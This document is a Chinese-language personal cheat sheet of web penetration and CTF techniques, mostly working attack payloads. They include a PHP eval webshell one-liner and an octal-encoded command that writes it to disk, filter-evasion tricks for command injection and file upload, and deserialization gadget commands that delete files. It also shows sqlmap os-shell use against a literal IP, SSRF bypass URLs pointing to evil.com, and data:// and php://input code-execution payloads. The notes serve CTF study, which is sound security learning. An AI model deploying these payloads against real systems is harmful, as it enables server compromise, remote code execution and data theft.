# Web安全奇技淫巧



## 前期准备

### 请求-响应 思考方向 快速反应

|        网页内容        |            利用方向            |
| :--------------------: | :----------------------------: |
|        文件上传        | 文件上传漏洞，phar反序列化漏洞 |
| XML格式的数据/POST表单 |  XXE 注入/改为XML格式，再XXE   |
|       数据库查询       |            SQL注入             |
|        用户登录        |          身份认证漏洞          |
|  图片等服务器静态资源  |            目录遍历            |
|        授权操作        |          访问控制漏洞          |
|   请求中含有完整链接   |              SSRF              |
|   用户输入渲染到网页   |            XSS,SSTI            |
|      网站的公私钥      |              JWT               |

关注点：

1. 页面的功能点 
2. URL的查询参数
3. 重定向页面

### 信息收集

工具需求：

1. 对隐藏文件的目录，文件的探测  如www.zip .gi  index.php~, robots.txt   
2. 隐藏网页的探测
3. 网页注释

工具：

1. Burp Suite

 discover content  配置为短文件，短路径

2. Cansina  ---很大，很笨重

3. 手动配置资产清单，用burpSuite的intruder来访问

4. dirsearch   ``` dirsearch -u url```

   

手动收集：

1. 目录遍历  直接加..

2. 版本泄漏，诸如hg, git, svn什么的，用工具dvcd-ripper 

   1. ```docker run --rm -it -v /Users/fengyuanqiu/Desktop/dcvs-ripper/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u http://www.example.org/.git```

3. 假设取得了Webshell，或是可以远程执行代码, 

   1. ```sh 
      find -E . -iregex ".*/[f]+[l]+[a]+[g]+.*" 2>/dev/null | xargs  grep  ".*iscc{.*}.*"  2>/dev/null
      ```

4. php://filter/read=convert.base64-encode/resource= （需要分析源码，可在php的include函数中执行）

命令行操作：dirsearch , githack

docker执行： dvcd-ripper

```shell
docker run --rm -it -v /Users/fengyuanqiu/Desktop/dcvs-ripper/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u http://www.example.org/.git
```

 ### XSS 测试

1. 参数后面加&id=kkk,查看响应的页面是否有回显
2. 对标签进行暴力尝试，对属性暴力尝试（我记得做过相关的，但没有记录，可能需要考证）





## 渗透利用



### 任意文件上传

当存在上传点的时候，额外关注读取文件的方式，通过该方式可以读取文件，或是上传木马，然后执行

1. 读直接取某一个文件 http://127.0.0.1/?p=php://filter/convert.base64-encode/resource=flag
   1. php://filter/read=convert.base64-encode/resource= 读取当前目录下的文件（php, flag）
   
2. Naginx 配置错误  http://IP:PORT/img../

3. 图片文件可见，可用phar协议，则利用php通用反序列化脚本生成恶意PHP再嵌入到 JPG文件中，再用phar读取

4. 存在include文件包含，exitool工具（或是自定义，直接添加到末尾）将php代码嵌入到图片中，include执行

5. 如果存在严格的RCE字符串过滤  ，可以尝试上传文件之后，通过执行类似``` . /???/??????[@-[`-~]  ``` 的命令，来运行文件里面的shell命令。其中[@-[`-~]表示匹配A-Za-z的字符, 因为上传的文件先存储在 /tmp/phpXXXXX文件中，随机生成的文件名是php[0-9A-Za-z]{3,4,5,6}，然后再移动到另外的位置.+文件的路径名可以执行文件内的shell命令。

   





### SSRF 

Gopher

```shell
gopher://<host>:<port>/<gopher-path>_<TCP数据流>
```

绕过字符串过滤方法

1. 用2130706433（IP的32位值）、017700000001、127.1 代替127.0.0.1 
2. 注册自己的域名，然后重定向到127.0.0.1或是目标主机
3. 对某个字符进行两次URL编码，第二次是只对关键字编码
4. 利用#@来混淆过滤器(字符串解析时，会认为sotck是域名，@前面的是用户名和密码，但实际服务器解析，会删除掉#后面的注释，然后再和路径拼接)

```http
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

5. 利用网页本身的重定向逻辑绕过  有些请求返回的是重定向页面，有些是返回实际的内容（关注点）

```http
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

6. 盲SSRF漏洞 SSRF的返回值不会返回
7. 应用部分路径拼接到别的url,一定程度上也可以SSRF
8. 通过XXE注入来SSRF



### 命令注入

window 转义字符^

#### 命令执行绕过技巧

空格绕过（空格被过滤）

Windows ：%ProgramFiles:~10,1%

Liniux : 

1. for bash only  {echo,aaa}
2. $IFS$9

黑名单关键字（cat ,flag,<>之类的）

1. 利用变量拼接  linux下``` a=c;b=at;c=he;d=hello; $a$b ${c}${d}```

2. 使用通配符 ``` cat /tm?/fl*```

3. 借助已有文件的字符< >``` echo $(expr substr $(awk NR==1 xxx.php)) 1 1 ```

   

### 反序列化

https://www.freebuf.com/articles/web/276624.html

工具需求：

1. 自动转化序列化和反序列化的代码 支持php java ruby
2. 根据环境，依赖自动构造Gadget Chains链。    Java:ysoserial  PHP：phpggc

工具：

Phpgcc

```sh
./phpggc -l symfony  #查看类 存在漏洞的版本
./phpggc -i symfony/rce1 #查看使用方法
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 
```

Ysoserial 

```sh
java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

服务端模版注入

工具需求：

1. 分别注入点是属于那种模版，并找到对应的模版的命令执行方式，语法

2. 需要一种可以在模版网站上快速搜索相关漏洞使用的方法，比如命令执行，如何新建一个命令执行的类



### SQL注入

工具需求：自动注入SQL，绕过检测

工具: SQLMAP

```shell
#进入sql命令行界面
python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —sql-shell
#进入shell命令行界面
python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —os-shell

# 添加cookie
—cookie=”security=low;PHPSESSID=121123131”
#对于get方式
-m url.txt ::使用一个包含多个url的文件进行扫描。若有重复，sqlmap会 自动识别成一个。
-u “URL” : 指定URL，get请求方式
#对于POST方式
-r request.txt : Post提交方式
#直接连接数据库
-d : mysql表示数据库类型、user:password表示目标服务器的账号和密 码，@后表示要连接的服务器，3306表示端口，zakq_ dababasename表 示连接的数据库名称
python sqlmap.py -d “mysql://root:root@192.168.126.128:3386/zkaq_databasename”

#使用tamper模块，对注入字符串绕过
sqlmap.py XXXXX --tamper="模块名"

```

模块的选择：

|         type         | model name                                                   |
| :------------------: | :----------------------------------------------------------- |
|       General        | tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes |
| Microsoft SQL Server | tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes |
|        MySQL         | tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor |
|        Oracle        | tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor |
|   Microsoft Access   | tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords |
|      PostgreSQL      | tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor |







### JWT



1. 暴力破解

   ```shell
   hashcat -a 0 -m 16500 <jwt> <wordlist> #-a -0表示采用密码本暴力破解 -m 16500代表JWT破解
   docker run -it --rm  jwtcrack <token> [字符范围] [最长字符数] [sha512]
   ```

   

2. 研究破解

   ```shell
   docker run --rm -it portswigger/sig2n <token1> <token2>
   ```





### 字符串绕过

工具需求：

1. 自动生成各种情况下的绕过语句

shell命令绕过：

1. 完全匹配某一个命令 echo         使用单双引号隔开   e'cho'  

2. 对所有空格都过滤  使用\t代替空格

3. 适用于Ubuntu等类型的操作系统()

   1. 空格绕过  cat${IFS}flag.txt    {echo, hello}

   2. 写马``` <?php @eval($_POST['c']);?>```

      ```sh
      {printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
      ```

      

SQL 注入的绕过  ：

见SQL注入（直接使用sqlmap自带的绕过函数）

URL 夹杂恶意的域名（SSRF补充）

```sh
1. http://whitelist.com@evil.com
2. http://evil.com\a.whitelist.com
3. http://evil.com?a.whitelist.com
4. http://evil.com#a.whitelist.com
```



文件名绕过 添加.php

1. 空字节注入 shell.php%00.png
2. 双写扩展名 shell.jpg.php

通用：直接在jpeg图片的最后添加一句话马，可以绕过对图片格式的检测，然后命名为1，2方式，或是用类似```pht, phpt, phtml, php3,php4,php5,php6``` 的古老扩展名执行



Javascript 绕过

PHP 绕过

HTML 绕过

CSP 绕过

```<img src=1 onerror=alert()>```

## web基础知识

### PHP

关键函数phpinfo

#### PHP知识点：

1. array("0"=>array(new classname(),function))  函数数组
2. include 可以执行**PHP伪协议**，协议遵守URL 规范，可以URL编码绕过，可结合php://filter读取文件的内容，可直接包含文件来执行其中的php语句
3. preg_match，echo 可以触发__toString方法
4. PHP的字符串内，如果要插入变量，可以在字符串中插入$var的方式实现，用双引号
5. eval("var_dump($$flag);"); eval将字符串的内容按照php解析，var_dump解析变量并输出，$flag="GLOBALS",可以输出全局变量
6. exec("id") system("id") 可以用于执行**系统命令**，前者返回内容，后者直接打印内容
7. 比较有用的公开类 GlobIterator：遍历一个文件系统    SplFileObject：读取大文件 

```php
$iterator = new GlobIterator('/path/to/directory/*.php');//返回匹配的文件名
$file = new SplFileObject('/path/to/file.txt', 'r'); //读取相关文件
```

#### PHP 伪协议

伪协议一般在include内执行

a) file://绝对路径   (要读取相对路径直接读就行)   <font color=red>可在include,fopen函数执行</font>

b) php://filter/(read/write)=(过滤器1｜过滤器2)/resource=(文件路径) <font color=red>可在include,fopen函数执行</font>

php://filter/read=convert.base64-encode/resource= 

read 的时候表示读取文件内容，并通过过滤器对文件内容处理

write的时候表示打开文件并写入，需要结合文件函数，写入的内容通过过滤器

过滤器有以下几种：

| 字符串过滤器 | 作用                           |
| ------------ | ------------------------------ |
| string.rot13 | 等同于`str_rot13()`，rot13变换 |

| 转换过滤器                                    | 作用                                                       |
| --------------------------------------------- | ---------------------------------------------------------- |
| convert.base64-encode & convert.base64-decode | 等同于`base64_encode()`和`base64_decode()`，base64编码解码 |

 c) php://input+POST数据部分. 可用于执行PHP代码.  <font color=red>可在fopen函数执行,include需要设置php.ini为on</font>  <font color=blue>可以让文件包含漏洞变为命令执行漏洞</font>

条件：

1. ```<?php @eval(file_get_contents('php://input'))?>```        post'data: echo "hello"
2. Include($_GET["file"])      ?file=php://input    post'data: ```<?php echo "hello"?>```   

d) data://   <font color=red>可在fopen,include需要设置php.ini为on</font>   <font color=blue>可以让文件包含漏洞变为命令执行漏洞</font> 

```sh
data://text/plain,<?php%20phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

总结：

![image-20230522151634967](/Users/fengyuanqiu/Library/Application Support/typora-user-images/image-20230522151634967.png)

详细见 [PHP伪协议总结](https://www.cnblogs.com/cainiao-chuanqi/p/15818547.html)





### 中间件

位于系统软件和应用软件之间，软件通过它可以更方便的调用系统的功能，如通信，数据库管理



### WAF工作原理

将所有的请求导向一个WAF服务器，由该WAF服务器检测用户和服务器之间的流量，以此来防御

### 杂项

1. /var/www/html/是大部分服务器的根目录,主网页存放处
1. 一句话木马   <font color=red>\<?php @eval($_POST['c']);?></font>
